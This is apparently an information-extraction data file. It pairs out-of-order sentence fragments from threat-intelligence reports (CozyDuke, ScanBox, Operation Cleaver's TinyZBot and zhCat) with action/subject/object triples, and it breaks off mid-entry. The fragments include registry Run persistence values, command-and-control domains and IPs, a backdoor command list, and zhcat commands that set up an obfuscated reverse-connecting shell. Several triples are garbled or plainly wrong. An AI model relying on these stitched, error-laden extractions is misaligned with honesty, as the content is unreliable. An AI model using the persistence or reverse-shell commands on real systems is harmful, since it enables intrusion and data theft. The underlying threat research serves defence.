               \n       CurrentVersion\\Run\\                                  \n\n\n                     <figure></figure> <caption> FIGURE 3: SCREENSHOT OF A DECRYPTED COZYDUKE CONFIGURATION FILE </caption>\n\n    \u2022  HKLM\\Software\\Microsoft\\Windows\\\n       CurrentVersion\\Policies\\Explorer\\Run\n    \u2022  HKCU\\Software\\Microsoft\\Windows\\\n       CurrentVersion\\Policies\\Explorer\\Run\n</list>\n  The name of the registry value will usually be the\n  filename, (without the extension) of the CozyDuke main\n  component": [{"adding": {"A": "adding", "S": "CozyDuke", "O": ["to be executed at system startup", "a registry value"]}}], " In this case, however, instead of dropping\nCozyDuke, the executables may drop other executables,    \nscripts or DLLs": [{"drop": {"A": "drop", "S": "the executables", "O": ["other executables, scripts or DLLs"]}}], " To achieve this, CozyDuke\n  will \u201chijack\u201d the registry entries for the COM object\n  \u201cSharedTaskScheduler\u201d": [{"\u201chijack\u201d": {"A": "\u201chijack\u201d", "S": "CozyDuke", "O": ["the registry entries for the COM object \u201cSharedTaskScheduler\u201d"]}}], "\n Tasks\n CozyDuke\u2019s primary purpose is the execution of tasks": [{"is": {"A": "is", "S": "CozyDuke\u2019s primary purpose", "O": ["the execution of tasks"]}}], " The first consists of CozyDuke modules   \nwhich are DLL files loaded in memory by the main         \ncomponent of CozyDuke for the purposes of extending      \nCozyDuke\u2019s functionality": [{"extending": {"A": "extending", "S": "CozyDuke modules", "O": ["CozyDuke\u2019s functionality"]}}], " This dropper will then proceed to         \nwrite to disk the main CozyDuke components as well as an      \nencrypted configuration file used by CozyDuke": [{"write": {"A": "write", "S": "This dropper", "O": ["the main CozyDuke components", "to disk", "encrypted configuration file used by CozyDuke"]}}], " In the cases we have observed, the               \n  configuration data for any single CozyDuke instance has              \n  included the details of either one or two C&C servers": [{"included": {"A": "included", "S": "the configuration data for any single CozyDuke instance", "O": ["the details of either one or two C&C servers"]}}], " An example list is\n   shown in the following screenshot:\n\n\n\n<footnote>\n   1 http://pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-\n   1.html\n   2 https://www.alienvault.com/open-threat-exchange/blog/scanbox-a-reconnaissance-framework-used-on-watering-\n\n   hole-attacks\n</footnote>\n\n\n<footer> Cyber Threat Operations </footer>\n\n<header> \f   Tactical Intelligence Bulletin \u2013 TLP:WHITE </header>\n\n\n\n\n   <heading> checkDrives </heading>\n   In one cluster of ScanBox activity, instead of checking for specific files as per the method above, the\n   attackers have implemented a different method of tracking files and drives present on the victim machine": [{"tracking": {"A": "tracking", "O": ["files and drives present on the victim machine"]}}], " However one group of attackers using\n   the ScanBox framework are now actively sending e-mails to potential victims, where the e-mails contain\n   links to websites hosting ScanBox": [{"contain": {"A": "contain", "S": "the e-mails", "O": ["links to websites hosting ScanBox"]}}], "\n\n   For those who didn\u2019t read our last entry on the framework, nor the excellent work by Jaime Blasco2 which\n   preceded it, ScanBox is a framework written in JavaScript and PHP which allows an attacker to perform\n   reconnaissance and key logging of visitors to compromised websites without requiring any malware to be\n   downloaded or installed": [{"perform": {"A": "perform", "S": "an attacker", "O": ["reconnaissance and key logging of visitors to compromised websites"]}}], "\n\n\n\n\n<footer> Cyber Threat Operations </footer>\n\n<header> \f   Tactical Intelligence Bulletin \u2013 TLP:WHITE </header>\n\n   Whilst macanna.com[.]tw appears to be a legitimate site, it has also been observed as being a command\n   and control destination for malware": [{"being": {"A": "being", "S": "it", "O": ["a command and control destination for malware"]}}], "\n\n      ScanBox performs keylogging of users when they visit a compromised website, without requiring malware\n      to be deployed, and can collect a great deal of information which can be used to tailor future attacks\n\n      In October we published some details of the ScanBox tool set": [{"performs": {"A": "performs", "S": "ScanBox", "O": ["keylogging of users", "when they visit a compromised website"]}}], "\n\nBased upon some cursory analysis the backdoor will look for encrypted commands within HTML comments\nreturned from the C2 using the following format: \"<!\u00ad\u00ad?*$@COMMAND\u00a0GOES\u00a0HERE@$*?\u00ad\u00ad!>\u037e\"however,\nthe C2 was not active at the time of analysis so this could not be confirmed.\u00a0 The backdoor may also make\nrequests to the C2 over HTTP using the following parameters in the URI string \"query?sid=\" and \"result?\nsid=\".\u00a0\n\nThe PDB path, C:\\Codes\\Eoehttp\\Release\\Eoehttp.pdb, was also left in the backdoor although no\nother instances of this path could be identified.\u00a0 Several additional exploit documents were identified by\ninvestigating the domains \"fighthard.mooo.com\" and \"rampage.freetcp.com\"": [{"make": {"A": "make", "S": "The backdoor", "O": ["over HTTP", "to the C2", "using the following parameters in the URI string", "requests"]}}, {"look for": {"A": "look for", "S": "the backdoor", "O": ["encrypted commands", "within HTML comments returned from the C2"]}}], " The\nbackdoor routine exists inside the DllMain function so when explorer.exeloads the backdoor via\nLoadLibrary it will begin spawning malicious threads.\u00a0\n\nA PDB path was also left in this binary C:\\Users\\cmd\\Desktop\\msacm32\\Release\\msacm32.pdb; A quick\ngoogle search will lead you to a YARA rule written by Patrick Olsen and the very similar sample\n869fa4dfdbabfabe87d334f85ddda234 which communicates to www.micro1.zyns.com on TCP port 80": [{"spawning": {"A": "spawning", "S": "it", "O": ["malicious threads"]}}, {}], " Interestingly the backdoor will also load the legitimate\nsystem32\\msacm32.drv\u00a0file resolve functions and pass calls to it so it doesn't break audio playback on the\nvictim system.\u00a0 The backdoor contains identical exports as well as an additional dummy function from the\nlegitimate msacm32.drvcalled \"StartWork\" which can be used to reliably identify similar samples": [{"load": {"A": "load", "S": "the backdoor", "O": ["the legitimate system32\\msacm32.drv\u00a0file"]}}, {"contains": {"A": "contains", "S": "The backdoor", "O": ["identical exports", "additional dummy function from the legitimate msacm32.drvcalled \"StartWork\""]}}], " The binary is configured to communicate to \"www.microsoftservices.proxydns.com\"\non port 80 using standard HTTP POST and GET requests": [{"communicate": {"A": "communicate", "S": "The binary", "O": ["on port 80", "using standard HTTP POST and GET requests", "to \"www.microsoftservices.proxydns.com\""]}}], "\n\nOn reboot explorer.exe\u00a0was now happy to load the backdoor and get down to business; this technique is\nknown as dll search order hijacking or binary planting": [{"load": {"A": "load", "S": "explorer.exe", "O": ["the backdoor", "On reboot"]}}], " \u00a0The decoded binary will be written to the filesystem as\n\"%APPDATA%\\Microsoft\\Systemcertificates\\Certificates.ocx\".\u00a0\u00a0\n\nFile Details\n\nFull File Path      %APPDATA%\\Microsoft\\Systemcertificates\\Certificates.ocx\u00a0\nSHA256              9d838fd9d21778ed9dc02226302b486d70ed13d4b3d914a3b512ea07bf67e165\u00a0\nFile Size           107,008 bytes\u00a0\nCompile Time        2/4/2015 8:41:42 UTC\n\f\u00a0\n\n\n\n\nThe malware does not execute immediately after successful exploitation and instead just creates a Run key\nin the current user's hive which will execute the next time the victim user accesses the system.\u00a0\u00a0\n\nRegistry Persistence Key     \u00a0 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Certificates\u00a0\nRegistry Key Value           \u00a0 Rundll32.exe \"%APPDATA%\\Microsoft\\SystemCertificates\\Certificates.ocx\",Setup\n\u00a0\n\nThe ocx file is actually a DLL and provides the attacker the ability to upload, download, enumerate, delete,\nsearch, and execute files as well as list drivers on the system": [{"execute": {"A": "execute", "S": "the attacker"}, "upload": {"A": "upload", "S": "the attacker"}, "delete": {"A": "delete", "S": "the attacker"}, "list": {"A": "list", "S": "the attacker", "O": ["on the system", "drivers"]}, "download": {"A": "download", "S": "the attacker"}, "enumerate": {"A": "enumerate", "S": "the attacker"}, "search": {"A": "search", "S": "the attacker"}}, {"creates": {"A": "creates", "S": "The malware", "O": ["a Run key", "in the current user's hive"]}}], " The binary is designed to be called from its one\nexported function, \"Setup\"; the Run key will ensure that whenever the victim user logs into the system the\nbackdoor will execute": [{"execute": {"A": "execute", "S": "the backdoor", "O": ["whenever the victim user logs into the system"]}}], " A bug fix is made\n  to the keystroke logging method, and clipboard monitoring is enabled": [{"is made": {"A": "is made", "O": ["A bug fix", "to the keystroke logging method"]}}, {"is enabled": {"A": "is enabled", "O": ["clipboard monitoring"]}}], "\n</section>\n\n\n\n<footer>35</footer>\n\f\n<header>\nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n</header>\n\n<section>\n<heading>PRIVILEGE ESCALATION & PIVOTING</heading>\nPrivilege escalation is a category of techniques that describe the process of going from a less\nprivileged user on a compromised computer to a more privileged user": [{"is": {"A": "is", "S": "Privilege escalation", "O": ["a category of techniques that describe the process of going from a less privileged user on a compromised computer to a more privileged user"]}}], "\n\nSince the first version of the SOAP-based command and control protocol was implemented,\nTinyZBot used what is referred to as a \u201cdynamic password\u201d": [{"was implemented": {"A": "was implemented", "O": ["the SOAP-based command and control protocol"]}}], "\ntmu</string><string>[ALL]__b93c-49a1-140914090807__[00000000000000000000000000000000].tmu</\nstring><string>[ALL]__b93c-49a1-140915103605__[00000000000000000000000000000000].tmu</\nstring><string>[ALL]__b93c-49a1-140915103610__[00000000000000000000000000000000].tmu</string></\nGetFileListResult></GetFileListResponse></soap:Body></soap:Envelope>\n</code>\n\nIn order to download the file and parse for commands to execute, the TinyZBot must request the\nfile": [{"request": {"A": "request", "S": "the TinyZBot", "O": ["the file"]}, "download": {"A": "download", "S": "the TinyZBot", "O": ["the file"]}}], " Double encoding\nSQL injection payloads allows for bypassing of various anti-exploitation filters, such as those\nsupplied by Web Application Firewalls (WAFs)": [{"allows": {"A": "allows", "S": "Double encoding SQL injection payloads", "O": ["for bypassing of various anti-exploitation filters, such as those supplied by Web Application Firewalls (WAFs)"]}}], " The sending is\nperformed by internally developed malware samples such as TinyZBot and Csext in order to\nexfiltrate information about the infected computer, as well as requested files and keystroke\nlogging information": [{"is performed": {"A": "is performed", "S": "internally developed malware samples such as TinyZBot and Csext", "O": ["The sending", "in order to exfiltrate information about the infected computer, as well as requested files and keystroke logging information"]}}], "\n\n</section>\n\n\n<footer>41</footer>\n\f\n<header>\nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure> \n\n</header>\n<section>\n<heading>Anonymous FTP Servers</heading>\nCleaver Operations observed in 2013 mainly utilized FTP servers with anonymous access\nenabled in order to pilfer large quantities of information": [{"utilized": {"A": "utilized", "S": "Cleaver Operations", "O": ["in order to pilfer large quantities of information", "FTP servers", "with anonymous access enabled"]}}], " These are scripts or applications that allowed\n  for command or code execution outside of the victim network": [{"allowed": {"A": "allowed", "S": "scripts or applications", "O": ["for command or code execution outside of the victim network"]}}], "\n\nFor the command and control examples below, red text represents TCP data sent from the\nTinyZBot infection while blue text represents TCP data sent from the command and control\nserver": [{"sent": {"A": "sent", "O": ["TCP data", "from the command and control server"]}}, {"sent": {"A": "sent", "O": ["from the TinyZBot infection", "TCP data"]}}], " This zhCat\n  instance is running cmd.exe, effectively making it a reverse connecting shell": [{"making": {"A": "making", "O": ["it", "a reverse connecting shell"]}}, {"is running": {"A": "is running", "S": "This zhCat instance", "O": ["cmd.exe"]}}], " A command and control protocol was established, using HTTP and SOAP for the\n protocol": [{"was established": {"A": "was established", "O": ["A command and control protocol"]}}, {"using": {"A": "using", "S": "A command and control protocol", "O": ["for the protocol", "HTTP and SOAP"]}}], "\n\n</section>\n<footer>44</footer>\n\f\n<header>#OPCLEAVER</header>\n<section>\n\n <heading>zhCat (cont.)</heading>\n\n<figure></figure>\n\n Upon inspecting the network traffic again, we see the following HTTP POST request": [{"see": {"A": "see", "S": "we", "O": ["the following HTTP POST request"]}}], " We originally located it on a staging server being utilized for multiple attacks as well as\na tool for sharing data between members of the organization\u2019s team": [{"being utilized": {"A": "being utilized", "O": ["a staging server", "for multiple attacks as well as a tool for sharing data between members of the organization\u2019s team"]}}], " The commands as well as infected computer information are transferred in the Content-\n  Disposition HTTP header, making the traffic easy to pass over as benign": [{"are transferred": {"A": "are transferred", "O": ["in the Content- Disposition HTTP header", "The commands as well as infected computer information"]}}, {"pass over": {"A": "pass over", "S": "the traffic", "O": ["as benign"]}}], " This allowed supplemental tools to keep TinyZBot running by enumerating\n every process and checking if the process ID and mutex prefix existed": [{"enumerating": {"A": "enumerating", "S": "supplemental tools", "O": ["every process"]}}], " PrivEsc is a compiled exploit, which leverages\nthe vulnerability commonly referred to as KiTrap0D (CVE-2010-0232)": [{"leverages": {"A": "leverages", "S": "PrivEsc", "O": ["the vulnerability commonly referred to as KiTrap0D (CVE-2010-0232)"]}}], " 73\n</toc>\n\n\n\n<footer>4</footer>\n\f\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>EXECUTIVE SUMMARY</heading>\n  Since at least 2012, Iranian actors have directly attacked,\n  established persistence in, and extracted highly sensitive\n  materials from the networks of government agencies and major\n  critical infrastructure companies in the following countries:\n  Canada, China, England, France, Germany, India, Israel,\n  Kuwait, Mexico, Pakistan, Qatar, Saudi Arabia, South Korea,\n  Turkey, United Arab Emirates, and the United States": [{"established": {"A": "established", "S": "Iranian actors", "O": ["persistence"]}, "extracted": {"A": "extracted", "S": "Iranian actors", "O": ["highly sensitive materials"]}}], " This can make it useful for tools like the PVZ tool chain and Csext to execute\nwith logged results:\n\n\n<figure></figure>\n\n                          <caption>Figure 22: The MimikatzWrapper dumps credentials out to a file.</caption>\n</section>\n\n\n<footer>38</footer>\n\f\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>PsExec Spreading</heading>\n  Once an attacker has credentials extracted from the cache, whether in hash form or in plaintext\n  form, PsExec can be used to run commands on any other computer which accepts those domain\n  credentials": [{"execute": {"A": "execute", "S": "tools like the PVZ tool chain and Csext", "O": ["with logged results"]}}, {"extracted": {"A": "extracted", "S": "an attacker", "O": ["credentials", "from the cache"]}}, {"run": {"A": "run", "S": "PsExec", "O": ["on any other computer which accepts those domain credentials", "commands"]}}], " This keystroke logger source is publicly\n  available and referred to as DeadkeyLogger": [{"is": {"A": "is", "S": "This keystroke logger source", "O": ["publicly available and referred to as DeadkeyLogger"]}}], " This\n  copy repeats the behavior of the original, but with already discovered credentials as well as\n  newly discovered ones on the newly infected host": [{"repeats": {"A": "repeats", "S": "This copy", "O": ["but with already discovered credentials as well as newly discovered ones on the newly infected host", "the behavior of the original"]}}], " Many versions were obfuscated with a legitimate tool for developers named\nSmartAssembly, which makes the recovery of some names implausible": [{"were obfuscated": {"A": "were obfuscated", "O": ["Many versions", "with a legitimate tool for developers named SmartAssembly"]}}], " HTTP communications are often used by botnets, but it is uncommon\nto use a sub-protocol such as SOAP": [{"are often used": {"A": "are often used", "S": "botnets", "O": ["HTTP communications"]}}], " When early versions of TinyZBot were executed, they opened an image stored\n  in the resource section of the executable and copied the malicious TinyZBot executable to the\n  %AppData% directory": [{"opened": {"A": "opened", "S": "they", "O": ["an image stored in the resource section of the executable"]}, "copied": {"A": "copied", "S": "they", "O": ["to the %AppData% directory", "the malicious TinyZBot executable"]}}], " Command functionality is limited to executing supplied commands,\n  downloading and executing executables as well as self-updating": [{"is limited": {"A": "is limited", "O": ["to executing supplied commands", "Command functionality"]}}], " It also has a remotely installable trojan named Abel, which\n  enables some of its functionality on a remote target": [{"has": {"A": "has", "S": "It", "O": ["a remotely installable trojan named Abel"]}}, {"enables": {"A": "enables", "S": "a remotely installable trojan named Abel", "O": ["some of its functionality", "on a remote target"]}}], "\n  </section>\n\n  <section>\n  <heading>Deception</heading>\n   \n  TinyZBot is commonly installed using some form of deception": [{"is commonly installed": {"A": "is commonly installed", "O": ["TinyZBot", "using some form of deception"]}}], " Its functionality breaks down into three fairly standard components: SQL queries,\n  executing commands, and uploading files": [{"breaks down": {"A": "breaks down", "S": "Its functionality", "O": ["into uploading files"]}}], " This indicates that TinyZBot is not only being installed while impersonating a r\u00e9sum\u00e9\n creation suite, but is also impersonating potential employers when distributed": [{"is also impersonating": {"A": "is also impersonating", "S": "TinyZBot", "O": ["when distributed", "potential employers"]}}, {"being installed": {"A": "being installed", "O": ["while impersonating a r\u00e9sum\u00e9 creation suite", "TinyZBot"]}}], " This gives the attackers a\n  predictable method to regain access to a compromised network if they ever lose access": [{"regain": {"A": "regain", "S": "the attackers", "O": ["if they ever lose access", "access to a compromised network"]}}], " After an\n Internet connection is ensured, the malware (TinyZbot) is\n dropped and executed": [{"executed": {"A": "executed", "O": ["the malware (TinyZbot)"]}, "is dropped": {"A": "is dropped", "O": ["the malware (TinyZbot)"]}}, {"is ensured": {"A": "is ensured", "O": ["an Internet connection"]}}], "\n \u2022\t Pivoting and exploitation techniques leveraged existing public exploits for MS08-067 and\n    Windows privilege escalations, and were coupled with automated, worm-like propagation\n    mechanisms": [{"leveraged": {"A": "leveraged", "S": "Pivoting and exploitation techniques", "O": ["existing public exploits for MS08-067 and Windows privilege escalations"]}}, {"were coupled": {"A": "were coupled", "O": ["Pivoting and exploitation techniques", "with automated, worm-like propagation mechanisms"]}}], "\n  The changes made in zhCat allow for this information to be transferred with inline obfuscation and/\n  or encryption": [{"be transferred": {"A": "be transferred", "S": "zhCat", "O": ["this information", "with inline obfuscation and/ or encryption"]}}], "\n  Much like PVZ-In, this command and control channel communicates with the Content-Disposition\n  HTTP header, but for file data, POST data is supplied": [{"communicates": {"A": "communicates", "S": "this command and control channel", "O": ["with the Content-Disposition HTTP header"]}}, {"is supplied": {"A": "is supplied", "O": ["for file data", "POST data"]}}], "\n\n  We have seen Csext configured to communicate with the following servers:\n<list>\n  \u2022 78.47.102.90, Germany, srv01.microsoftwindowsupdate(dot)net\n  \u2022 174.36.195.158, Washington D.C, USA, srv01.microsoftupdateserver(dot)\n  net\n</list>\n</section>\n\n\n\n<footer>59</footer>\n\f\n<header>\nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n</header>\n<cover>\n \n                      <heading>MITIGATION</heading>\n\n\n                  <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n\n                                                  #OPCLEAVER\n</cover>\n<footer>60</footer>\n\f\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>MITIGATION</heading>\n  If after reviewing the Indicators of Compromise (IOC) listed in Appendix A, you believe your\n  organization to be a victim of Operation Cleaver, we recommend you consider the following course\n  of action:\n\n  1": [{"communicate": {"A": "communicate", "S": "Csext", "O": ["with the following servers"]}}], "\n\n<figure></figure>\n\n\n                                       <caption>Figure 21: The MimikatzWrapper.</caption>\n\nThe only external difference is that MimikatzWrapper also logs these results to res.txt in the\nexecuting directory": [{"logs": {"A": "logs", "S": "MimikatzWrapper", "O": ["to res.txt", "in the executing directory", "these results"]}}], "\n\n An attacker could set up a server instance of zhCat with the following command in order to\n enable both HTTP and XOR obfuscation:\n<list>\n                                zhcat.exe \u2013h \u2013p 1000 \u2013l \u2013x\n</list>\n The client instance could then be invoked with the following command:\n<list>\n                     zhcat.exe \u2013h \u2013p 1000 \u2013i 192.168.116.128 \u2013x\n</list>\n Once again, information can be supplied via standard input": [{"set up": {"A": "set up", "S": "An attacker", "O": ["with the following command", "in order to enable both HTTP and XOR obfuscation", "a server instance of zhCat"]}}], " The exfiltration email address was also\n changed to TerafficAnalyzer(at)yahoo.com": [{"was also changed": {"A": "was also changed", "O": ["The exfiltration email address", "to TerafficAnalyzer(at)yahoo.com"]}}], " Many of their backdoors were web\n  applications, added to web servers, so commands can be executed from a browser or client able\n  to communicate with them": [{"be executed": {"A": "be executed", "O": ["from a browser or client able to communicate with them", "commands"]}}, {"were": {"A": "were", "S": "Many of their backdoors", "O": ["web applications"]}}], " WndTest starts using PHP servers for its command and control\nserver, some of which are listed as defaced sites": [{"using": {"A": "using", "S": "WndTest", "O": ["for its command and control server", "PHP servers"]}}], " The Operation Cleaver team was\nobserved attempting to use NetCat to exfiltrate information as well as use it as a reverse\nconnecting shell": [{"use": {"A": "use", "S": "The Operation Cleaver team", "O": ["it", "as a reverse connecting shell"]}}], " This was presumably done to limit antivirus detection of each individual file as\n  well as allow for dynamic updating of specific modules": [{"limit": {"A": "limit", "S": "This", "O": ["antivirus detection of each individual file"]}}], " If this technique is combined with cached credential dumping, it can be used to jump\n  from computer to computer on a compromised network": [{"is combined": {"A": "is combined", "O": ["this technique", "with cached credential dumping"]}}, {"jump": {"A": "jump", "S": "it", "O": ["from computer", "to computer", "on a compromised network"]}}], "\n                            \n Operation Cleaver uses PLink to forward local RDP ports to remote SSH servers": [{"uses": {"A": "uses", "S": "Operation Cleaver", "O": ["to forward local RDP ports to remote SSH servers", "PLink"]}}], "\n\n</section>\n\n\n<footer>10</footer>\n\f\n<header>#OPCLEAVER</header>\n\n<section>\n <heading>Indicators of Compromise (IOC)</heading>\n \u2022\t Private signing certificates of one victim were captured allowing the Operation Cleaver team to\n    compromise the entirety of their organization": [{"compromise": {"A": "compromise", "S": "the Operation Cleaver team", "O": ["the entirety of their organization"]}, "were captured": {"A": "were captured", "S": "the Operation Cleaver team", "O": ["Private signing certificates of one victim"]}}], " It starts by\n  first extracting cached credentials from the infected computer\u2019s cache": [{"extracting": {"A": "extracting", "S": "It", "O": ["cached credentials", "from the infected computer\u2019s cache"]}}], " The purpose of TinyZBot is to gather\n  information from an infected computer as well as maintain and further access into a compromised\n  network": [{"maintain": {"A": "maintain", "S": "TinyZBot"}, "gather": {"A": "gather", "S": "TinyZBot", "O": ["from an infected computer", "information"]}, "further": {"A": "further", "S": "TinyZBot"}}], " If no mutex and process\n pair was located, another TinyZBot instance would be started": [{"be started": {"A": "be started", "O": ["If no mutex and process pair was located", "another TinyZBot instance"]}}], "\n</section>\n\n<section>\n  <heading>NetC (Net Crawler)</heading>\n  Net Crawler utilizes a cached credential dumping technique along with PsExec in order to\n  worm throughout a network, collecting any and all credentials that it can extract from credential\n  caches": [{"utilizes": {"A": "utilizes", "S": "Net Crawler", "O": ["along with PsExec", "a cached credential dumping technique"]}, "worm": {"A": "worm", "S": "Net Crawler", "O": ["throughout a network"]}, "collecting": {"A": "collecting", "S": "Net Crawler", "O": ["any and all credentials that it can extract from credential caches"]}}], " It was limited to logging keystroke data, sending emails, and creating\n a link in the user\u2019s startup folder for persistence": [{"logging": {"A": "logging", "S": "It", "O": ["keystroke data"]}, "creating": {"A": "creating", "S": "It", "O": ["a link", "in the user\u2019s startup folder", "for persistence"]}, "sending": {"A": "sending", "S": "It", "O": ["emails"]}}], " They achieved complete access to airport gates and their security\n control systems, potentially allowing them to spoof gate credentials": [{"allowing": {"A": "allowing", "S": "complete access to airport gates and their security control systems", "O": ["to spoof gate credentials", "them"]}}, {"achieved": {"A": "achieved", "S": "They", "O": ["complete access to airport gates and their security control systems"]}}], "\n\nThe following command and control servers for Logger Module have been observed:\n<list>\n212.87.154.14, Baden-Wurttemberg, Germany, kundenpflege.menrad(dot)de\n212.87.154.12, Baden-Wurttemberg, Germany, www.gesunddurchsjahr(dot)de\n</list>\n</section>\n\n<section>\n<heading>wndTest</heading>\nWndTest is the evolution of the PVZ tool chain into a single executable": [{"been observed": {"A": "been observed", "O": ["The following command and control servers for Logger Module"]}}], " It has the ability to dump stored and\n  cached credentials, and conduct attacks like ARP cache poisoning in order to capture credentials\n  being transmitted on the network": [{"dump": {"A": "dump", "S": "It", "O": ["stored and cached credentials"]}, "conduct": {"A": "conduct", "S": "It", "O": ["attacks like ARP cache poisoning"]}, "capture": {"A": "capture", "S": "It", "O": ["credentials being transmitted on the network"]}}], "\n  This makes the traffic between zhCat instances look like benign HTTP traffic": [{"makes": {"A": "makes", "S": "This", "O": ["the traffic between zhCat instances", "look like benign HTTP traffic"]}}], "\nThey were observed conducting SQL injections, controlling backdoors, as well as exfiltrating\ninformation using this address, and the address appears in multiple software configurations\nrecovered from staging servers over a period of time": [{"conducting": {"A": "conducting", "S": "They", "O": ["SQL injections"]}, "exfiltrating": {"A": "exfiltrating", "S": "They", "O": ["using this address", "information"]}, "controlling": {"A": "controlling", "S": "They", "O": ["backdoors"]}}], "\n</section>\n<footer>20</footer>\n\f\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>Shell Creator 2 (cont.)</heading>\n\n\n<figure></figure>\n\n          <caption>Figure 6: Shell Creator 2 alerts the user in red when the IP being used can be sourced to Iran.</caption>\n\n\n<figure></figure>\n\n                                          \n              <caption>Figure 7: Shell Creator 2 notifies the user in green when their source IP address is not Iran.</caption>\n\n</section>                               \n\n<section>\n  <heading>Net Crawler</heading>\n                       \n  Net Crawler is a tool developed in C# that exhibits worm-like behavior in order to gather cached\n  credentials from any and all accessible computers on an infected network": [{"exhibits": {"A": "exhibits", "S": "Net Crawler", "O": ["worm-like behavior"]}, "gather": {"A": "gather", "S": "Net Crawler", "O": ["from any and all accessible computers on an infected network", "cached credentials"]}}], " When executed, it will capture the user\u2019s keystrokes and save\nthem to a location which PVZ bot then exfiltrates": [{"exfiltrates": {"A": "exfiltrates", "S": "PVZ bot", "O": ["a location"]}, "capture": {"A": "capture", "S": "it", "O": ["the user\u2019s keystrokes"]}, "save": {"A": "save", "S": "it", "O": ["to a location", "them"]}}], "\n\nAs part of TinyZBot\u2019s command and control protocol, files can be exfiltrated over SOAP to the\ncommand and control server": [{"be exfiltrated": {"A": "be exfiltrated", "O": ["over SOAP", "files", "to the command and control server"]}}], " These tools are often support tools, either\n  monitoring the activity of other tools or supplementing the function of other tools gathering\n  information during the infiltration process": [{"supplementing": {"A": "supplementing", "S": "These tools", "O": ["the function of other tools gathering information during the infiltration process"]}, "monitoring": {"A": "monitoring", "S": "These tools", "O": ["the activity of other tools"]}}], " When executed, both applications are\n  written to a temporary directory and executed": [{"are written": {"A": "are written", "O": ["to a temporary directory", "both applications"]}, "executed": {"A": "executed", "O": ["both applications"]}}], "\n  exe ,taskkill.exe$$/F /PID {pid},00:29,00:35\n  %%\n  ##\n</list>\n  This configuration executes zhCat to connect back to srv01.microsoftwindowsupdate(dot)net (a\n  deceptive domain owned by this group with falsified Whois data attributing to Microsoft Investor\n  Relations) with XORed communication using the HTTP protocol on TCP port 443": [{"connect": {"A": "connect", "S": "zhCat", "O": ["on TCP port 443", "using the HTTP protocol", "back to srv01.microsoftwindowsupdate(dot)net (a deceptive domain owned by this group with falsified Whois data attributing to Microsoft Investor Relations)", "with XORed communication"]}}, {"executes": {"A": "executes", "S": "This configuration", "O": ["zhCat"]}}], " These RDP connections can\n be used to exfiltrate information visually, as well as to remotely control the computers hosting the\n RDP servers": [{"exfiltrate": {"A": "exfiltrate", "S": "These RDP connections", "O": ["information"]}, "remotely control": {"A": "remotely control", "S": "These RDP connections", "O": ["the computers hosting the RDP servers"]}}], " These\nFTP servers were also observed during the infection process, as infected computers were\noften instructed to download additional files from these FTP servers, including backdoors and\npivoting tools": [{"download": {"A": "download", "S": "infected computers", "O": ["additional files", "from these FTP servers"]}}, {"were also observed": {"A": "were also observed", "O": ["during the infection process", "These FTP servers"]}}], " This way it appears that the desired application was\n  executed, but the malware was also executed silently": [{"was also executed": {"A": "was also executed", "O": ["the malware"]}}], " This command\n  runs at 00:29 in the morning, and is killed by taskkill at 00:35": [{"is killed": {"A": "is killed", "S": "taskkill", "O": ["This command", "a 00:35"]}}], " The resulting log is written out\nto a location where PVZ-Out can exfiltrate it to its command and control server": [{"exfiltrate": {"A": "exfiltrate", "S": "PVZ-Out", "O": ["it", "to its command and control server"]}}, {"is written out": {"A": "is written out", "O": ["The resulting log"]}}], "\n\n Within our investigation, we had no direct evidence of a successful compromise of specific\n Industrial Control Systems (ICS) or Supervisory Control and Data Acquisition (SCADA) networks, but\n Cleaver did exfiltrate extremely sensitive data from many critical infrastructure companies allowing\n them to directly affect the systems they run": [{"exfiltrate": {"A": "exfiltrate", "S": "Cleaver", "O": ["from many critical infrastructure companies", "extremely sensitive data"]}}], "\n\n  The following is a list of supported commands that TinyZBot responds to:\n<list>     \n  COPY                                        \n  REPLACE                                     \n  DELETE                                      \n  UPLOAD                                      \n  FUPLOAD                                     \n  CLEARFILES                                  \n  CLEAROUPUTFOLDER                            \n  SAVECONFIG                                  \n  SAVETOCFGFILE                               \n  RESTART                       \n  RestartForce\n  KILL           \n  DEEPKILL       \n  EXIT           \n  EXITFORCE      \n  RUNAVDETECTOR  \n  RUNWAIT        \n  RUNCMD         \n  UCMD           \n  GETINFO        \n  GETSCREENSHOTHQ\n  GETSCREENSHOT   \n  CREATEUPLOADLIST\n  FORCERESTART    \n  FORCEEXIT       \n  UNLOADMODULE    \n  RELOADMODULE    \n  LOADMODULE      \n  UNLOADM         \n  RELOADM         \n  REMOVEM\n  UNLOADALL\n  RELOADALL\n  ADDSEC\n  REMSEC\n  ADDKV\n  CHGKV\n  REMKV\n  ADDK\n  REMOVEK\n</list>\n\n  Commands such as GETINFO are often run on newly infected systems, as they decide whether\n  the infection has hit the correct target": [{"decide": {"A": "decide", "S": "they", "O": ["whether the infection has hit the correct target"]}}, {"are often run": {"A": "are often run", "O": ["on newly infected systems", "Commands such as GETINFO"]}}, {"responds": {"A": "responds", "S": "TinyZBot", "O": ["to a list of supported commands"]}}], "\n \u2022\t Customized private tools with functions that include ARP poisoning, encryption, credential\n    dumping, ASP.NET shells, web backdoors, process enumeration, WMI querying, HTTP and\n    SMB communications, network interface sniffing, and keystroke logging": [{"include": {"A": "include", "S": "Customized private tools with functions", "O": ["encryption"]}}], " They gained access to PayPal\n and Go Daddy credentials allowing them to make fraudulent purchases and allowed unfettered\n access to the victim\u2019s domains": [{"gained": {"A": "gained", "S": "They", "O": ["access to PayPal and Go Daddy credentials"]}}, {"allowed": {"A": "allowed", "S": "access to PayPal and Go Daddy credentials", "O": ["unfettered access to the victim\u2019s domains"]}, "allowing": {"A": "allowing", "S": "access to PayPal and Go Daddy credentials", "O": ["to make fraudulent purchases", "them"]}}], " Clipboard monitoring\n  code was added, but not invoked": [{"was added": {"A": "was added", "O": ["Clipboard monitoring code"]}}], "\nThe command and control still supports upgrading, downloading, and executing of applications, as\nwell as executing batch scripts": [{"downloading": {"A": "downloading", "S": "he command and control"}, "executing": {"A": 